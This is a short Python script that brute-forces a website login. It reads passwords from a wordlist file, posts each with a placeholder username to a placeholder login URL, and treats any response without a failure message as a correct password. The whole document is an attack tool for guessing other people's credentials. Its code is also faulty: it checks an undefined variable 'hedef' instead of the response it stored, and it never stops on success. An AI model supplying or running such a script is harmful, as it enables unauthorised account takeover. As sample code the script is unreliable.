import requests

with open("password.txt") as passwords:
    for password in passwords:
        password = password.replace("\n", "")
        payload = {'username' : '< Here is for username >', 'password': password}
        website = requests.post("<Login page Url>", data=payload)
        if "Your name or password is wrong. " in hedef.text: # You can change this according to website 
            print(" Wrong Password: " + password)
        else: 
            print("True Password : " + password)
            
